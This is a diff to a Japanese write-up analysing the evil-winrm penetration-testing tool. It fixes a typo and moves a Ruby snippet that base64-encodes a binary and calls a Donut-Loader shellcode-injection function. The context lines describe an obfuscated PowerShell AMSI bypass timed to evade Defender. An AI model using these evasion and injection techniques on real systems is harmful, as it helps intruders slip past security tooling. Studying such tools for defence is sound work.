@@ -132,7 +132,7 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 ```
 AMSIをバイバスするためにPowershellが実行される  
 このPowershellは、evil-winrmのコード上では「変数名のランダム化＋文字列をバイト変換＋Base64で難読化」されている（[リンク](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L1059)）  
-ちなみにこのPowershellを一気に実行するとDefenderでは検知されるので、各「#jamp」コードごとに２秒待機するようになっている
+ちなみにこのPowershellを一気に実行するとDefenderでは検知されるので、各「#jump」コードごとに２秒待機するようになっている
 ```powershell
 FUncTIon Get-PZ2zmpurexnDXVSxx {
     Param ($ljOHgifgLteNDYGV, $HWN81YY7isiEXwOd)
@@ -260,14 +260,6 @@ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
 
 
 ## [Donut-Loader](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L798)
-powershellで「」
-```ruby
-pid = donut_Loader[2]
-load_executable = donut_Loader[4]
-load_executable = File.binread(load_executable)
-load_executable = Base64.strict_encode64(load_executable)
-output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
-```
 このPowershellは、evil-winrmのコード上では「Base64で難読化」されている（[リンク](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L579)）
 ```powershell
 function Donut-Loader {param($process_id,$donutfile)
@@ -305,6 +297,14 @@ $base64 = $donutfile
 [ShellcodeTest.Program]::Main($array)
 }
 }
+```
+上のpowershellが読み込まれた後「Donut-Loader」関数を実行できる。引数のファイルはバイナリで読み込んだ後Base64に変換する
+```ruby
+pid = donut_Loader[2]
+load_executable = donut_Loader[4]
+load_executable = File.binread(load_executable)
+load_executable = Base64.strict_encode64(load_executable)
+output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
 ```
 どうやら先程のアセンブリは、.NET製っぽいのでdnSpyでデコンパイルできた
 ```csharp
